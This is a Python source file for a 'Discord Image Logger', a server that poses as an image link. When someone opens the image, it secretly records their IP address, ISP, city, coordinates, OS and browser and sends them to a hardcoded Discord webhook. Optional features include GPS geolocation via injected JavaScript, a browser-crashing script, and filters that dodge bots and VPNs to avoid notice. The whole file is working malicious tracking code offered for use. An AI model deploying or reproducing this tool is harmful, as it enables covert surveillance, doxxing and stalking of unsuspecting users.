# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1336119652492771462/9YpG2gbivbu0dqnay107wCu2DRA1XvjKL88h-PFQ134XG5oUBMfNWpJv1O0Z492iv8Ky",
    "image": "data:image/jpeg;base64,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"
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
